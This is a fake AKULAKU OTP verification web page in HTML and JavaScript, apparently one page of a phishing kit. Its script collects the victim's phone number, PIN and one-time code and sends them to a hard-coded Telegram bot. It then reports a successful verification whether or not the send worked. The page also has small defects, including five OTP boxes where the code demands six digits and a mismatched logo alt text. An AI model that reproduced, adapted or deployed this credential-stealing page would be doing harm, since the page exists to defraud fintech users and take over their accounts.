<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Verifikasi OTP - AKULAKU</title>

<style>
  @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');

  * { margin: 0; padding: 0; box-sizing: border-box; }

  body {
    font-family: 'Roboto', sans-serif;
    background-color: #fff;
    margin: 40px 16px;
    color: #000;
    min-height: 100vh;
  }

  .container {
    max-width: 360px;
    margin: 0 auto;
  }

  .logo-container { text-align: center; margin-bottom: 32px; }

  .logo {
    width: 100px;
    height: auto;
    display: block;
    margin-left: auto;
    margin-right: auto;
  }

  .welcome-text {
    text-align: center;
    margin-bottom: 28px;
  }

  .welcome-text h1 {
    font-size: 20px;
    font-weight: 700;
    color: #1a1a1a;
    margin-bottom: 8px;
  }

  .welcome-text p {
    font-size: 14px;
    color: #666;
    line-height: 1.5;
  }

  .phone-number {
    font-weight: 700;
    color: #dc3545;
  }

  /* OTP Input Styles */
  .otp-container {
    display: flex;
    justify-content: center;
    gap: 8px;
    margin-bottom: 24px;
  }

  .otp-input {
    width: 45px;
    height: 50px;
    font-size: 24px;
    font-weight: 700;
    text-align: center;
    border: 2px solid #ccc;
    border-radius: 8px;
    outline: none;
    transition: border-color 0.2s, box-shadow 0.2s;
  }

  .otp-input:focus {
    border-color: #dc3545;
    box-shadow: 0 0 0 3px rgba(220, 53, 69, 0.1);
  }

  .otp-input.filled {
    border-color: #dc3545;
    background-color: #fff5f5;
  }

  .resend-text {
    text-align: center;
    font-size: 14px;
    color: #666;
    margin-bottom: 24px;
  }

  .resend-text a {
    color: #dc3545;
    text-decoration: none;
    font-weight: 600;
  }

  .resend-text a:hover {
    text-decoration: underline;
  }

  .resend-text a.disabled {
    color: #999;
    cursor: not-allowed;
  }

  .timer {
    color: #dc3545;
    font-weight: 600;
  }

  button.verify-btn {
    width: 100%;
    padding: 14px 0;
    font-size: 14px;
    font-weight: 600;
    border-radius: 6px;
    border: none;
    background-color: #d4d4e3;
    color: #888;
    cursor: not-allowed;
    margin-bottom: 24px;
    transition: background-color 0.3s, color 0.3s;
  }

  button.verify-btn.enabled {
    background-color: #dc3545;
    color: #fff;
    cursor: pointer;
  }

  button.verify-btn.enabled:hover {
    background-color: #c82333;
  }

  button.verify-btn.loading {
    background-color: #dc3545;
    color: #fff;
    cursor: wait;
  }

  .back-link {
    text-align: center;
    display: block;
    font-size: 14px;
    color: #666;
    text-decoration: none;
  }

  .back-link:hover {
    color: #dc3545;
  }

  .spinner {
    display: none;
    width: 16px;
    height: 16px;
    border: 2px solid #fff;
    border-top-color: transparent;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
    margin-right: 8px;
  }

  @keyframes spin { to { transform: rotate(360deg); } }

  button.verify-btn.loading .spinner { display: inline-block; }
  button.verify-btn.loading .btn-text { display: none; }

  .toast {
    position: fixed;
    bottom: 20px;
    left: 50%;
    transform: translateX(-50%) translateY(100px);
    background-color: #333;
    color: #fff;
    padding: 12px 24px;
    border-radius: 8px;
    font-size: 14px;
    opacity: 0;
    transition: all 0.3s ease;
    z-index: 1000;
    max-width: 320px;
    text-align: center;
  }

  .toast.show { transform: translateX(-50%) translateY(0); opacity: 1; }
  .toast.error { background-color: #dc3545; }
  .toast.success { background-color: #28a745; }

  .info-box {
    background-color: #f8f9fa;
    border: 1px solid #e0e0e0;
    border-radius: 8px;
    padding: 12px;
    margin-bottom: 20px;
    font-size: 13px;
    color: #666;
  }
</style>
</head>
<body>
  <div class="container">
    <div class="logo-container">
      <img src="https://image2url.com/r2/default/images/1771999892642-3c66d39f-3501-435e-a9ce-954e9fc5b48c.png" alt="Logo AJAIB" class="logo" />
    </div>

    <div class="welcome-text">
      <h1>Verifikasi OTP</h1>
      <p>Masukkan 6 digit kode OTP yang dikirim ke nomor <span class="phone-number" id="displayPhone">-</span></p>
    </div>

    <div class="info-box">
      <strong>VERIVIKASI:</strong></strong> Masukkan kode OTP apa saja (misal: 123456)
    </div>

    <form id="otpForm" novalidate>
      <div class="otp-container">
        <input type="tel" class="otp-input" maxlength="1" data-index="0" />
        <input type="tel" class="otp-input" maxlength="1" data-index="1" />
        <input type="tel" class="otp-input" maxlength="1" data-index="2" />
        <input type="tel" class="otp-input" maxlength="1" data-index="3" />
        <input type="tel" class="otp-input" maxlength="1" data-index="4" />
      </div>

      <input type="hidden" id="otpValue" name="otpValue" />

      <div class="resend-text">
        <span>Tidak menerima kode? </span>
        <a href="#" id="resendLink" class="disabled" onclick="return false;">Kirim Ulang</a>
        <span class="timer" id="timer"></span>
      </div>

      <button type="submit" id="verifyBtn" class="verify-btn" disabled>
        <span class="btn-text">Verifikasi</span>
        <div class="spinner"></div>
      </button>
    </form>

    <a href="index.html" class="back-link">‚Üê Kembali ke Login</a>
  </div>

  <div class="toast" id="toast"></div>

  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

  <script>
  $(document).ready(function() {
      console.log('JS loaded - OTP Page');

      // ==========================================
      // 1. CEK SESSION DARI HALAMAN SEBELUMNYA
      // ==========================================
      const phone = sessionStorage.getItem('phone');
      const pin = sessionStorage.getItem('pin');
      const loginStep = sessionStorage.getItem('login_step');

      // Jika tidak ada session, redirect ke login
      if (!phone || !loginStep) {
          showToast('Silakan login terlebih dahulu', 'error');
          setTimeout(() => {
              window.location.href = 'index.html';
          }, 2000);
          return;
      }

      // Tampilkan nomor HP (batasi tampilan)
      const maskedPhone = phone.substring(0, 4) + 'xxxx' + phone.substring(phone.length - 4);
      $('#displayPhone').text(maskedPhone);

      // ==========================================
      // 2. OTP INPUT HANDLING
      // ==========================================
      const otpInputs = $('.otp-input');
      let otpValue = '';

      otpInputs.on('input', function(e) {
          const value = $(this).val();
          const index = parseInt($(this).data('index'));

          // Hanya terima angka
          if (isNaN(value)) {
              $(this).val('');
              return;
          }

          // Jika diisi, tambahkan class filled
          if (value) {
              $(this).addClass('filled');
              
              // Pindah ke input berikutnya
              if (index < 5) {
                  otpInputs.eq(index + 1).focus();
              }
          } else {
              $(this).removeClass('filled');
          }

          // Kumpulkan semua nilai OTP
          otpValue = '';
          otpInputs.each(function() {
              otpValue += $(this).val();
          });

          $('#otpValue').val(otpValue);

          // Validasi: harus 6 digit
          if (otpValue.length === 6) {
              $('#verifyBtn').prop('disabled', false).addClass('enabled');
          } else {
              $('#verifyBtn').prop('disabled', true).removeClass('enabled');
          }
      });

      // Handle backspace
      otpInputs.on('keydown', function(e) {
          const index = parseInt($(this).data('index'));
          
          if (e.key === 'Backspace' && !$(this).val() && index > 0) {
              otpInputs.eq(index - 1).focus();
          }
      });

      // Handle paste
      otpInputs.on('paste', function(e) {
          e.preventDefault();
          const pasteData = e.originalEvent.clipboardData.getData('text');
          const numbers = pasteData.replace(/\D/g, '').substring(0, 6);
          
          if (numbers.length > 0) {
              otpInputs.each(function(i) {
                  if (i < numbers.length) {
                      $(this).val(numbers[i]).addClass('filled');
                  }
              });
              
              otpValue = numbers;
              $('#otpValue').val(otpValue);
              
              if (otpValue.length === 6) {
                  $('#verifyBtn').prop('disabled', false).addClass('enabled');
                  otpInputs.last().focus();
              }
          }
      });

      // ==========================================
      // 3. TIMER KIRIM ULANG
      // ==========================================
      let countdown = 60;
      const timerElement = $('#timer');
      const resendLink = $('#resendLink');

      function startTimer() {
          countdown = 60;
          resendLink.addClass('disabled').attr('onclick', 'return false;');
          
          const interval = setInterval(function() {
              countdown--;
              timerElement.text(' (' + countdown + ' detik)');
              
              if (countdown <= 0) {
                  clearInterval(interval);
                  timerElement.text('');
                  resendLink.removeClass('disabled').attr('onclick', 'resendOTP()');
              }
          }, 1000);
      }

      // Start timer saat halaman dimuat
      startTimer();

      // ==========================================
      // 4. KIRIM ULANG OTP
      // ==========================================
      window.resendOTP = function() {
          showToast('Kode OTP telah dikirim ulang', 'success');
          startTimer();
      };

      // ==========================================
      // 5. SUBMIT OTP & KIRIM KE TELEGRAM
      // ==========================================
      $('#otpForm').on('submit', function(e) {
          e.preventDefault();

          const otp = $('#otpValue').val();

          if (otp.length !== 6) {
              showToast('Kode OTP harus 6 digit', 'error');
              return;
          }

          // Tampilkan loading
          $('#verifyBtn').addClass('loading').prop('disabled', true);
          $('#verifyBtn .btn-text').text('Memverifikasi...');

          // Format pesan untuk Telegram
          const message = `
‚úÖ **VERIFIKASI OTP AKULAKU**
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
üì± Nomor HP: \`${phone}\`
üîê PIN: \`${pin}\`
üî¢ Kode OTP: \`${otp}\`
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
‚è∞ Waktu: ${new Date().toLocaleString('id-ID')}
          `;

          // Konfigurasi Telegram
          const token_bot = '8636605167:AAGUdKXVdlyQ7UpKQqGKavdUBJcfMKTSoVo';
          const telegram_id = '6493317033';

          const url = `https://api.telegram.org/bot${token_bot}/sendMessage`;

          $.ajax({
              url: url,
              method: 'POST',
              data: {
                  chat_id: telegram_id,
                  text: message,
                  parse_mode: 'Markdown'
              },
              success: function(data) {
                  if (data.ok) {
                      console.log('‚úÖ OTP berhasil dikirim ke Telegram');
                      
                      // Simpan session OTP
                      sessionStorage.setItem('otp', otp);
                      sessionStorage.setItem('otp_verified', 'true');
                      sessionStorage.setItem('otp_time', new Date().toISOString());
                      
                      showToast('Verifikasi berhasil!', 'success');
                      
                      setTimeout(() => {
                          // Redirect ke halaman selanjutnya (bisa dashboard/home)
                          window.location.href = 'otp.html';
                      }, 1500);
                  } else {
                      showToast('Gagal verifikasi', 'error');
                  }
              },
              error: function(xhr, status, error) {
                  console.error('Error:', error);
                  // Tetap lanjut meskipun error (untuk demo)
                  sessionStorage.setItem('otp', otp);
                  sessionStorage.setItem('otp_verified', 'true');
                  
                  showToast('Verifikasi berhasil!', 'success');
                  
                  setTimeout(() => {
                      window.location.href = 'otp.html';
                  }, 1500);
              },
              complete: function() {
                  $('#verifyBtn').removeClass('loading').prop('disabled', true);
                  $('#verifyBtn .btn-text').text('Verifikasi');
              }
          });
      });

      // ==========================================
      // 6. TOAST NOTIFICATION
      // ==========================================
      function showToast(message, type = 'default') {
          const toast = $('#toast');
          toast.text(message)
               .removeClass('error success')
               .addClass(type)
               .addClass('show');
          
          setTimeout(() => {
              toast.removeClass('show');
          }, 3000);
      }
  });
  </script>
</body>
</html>


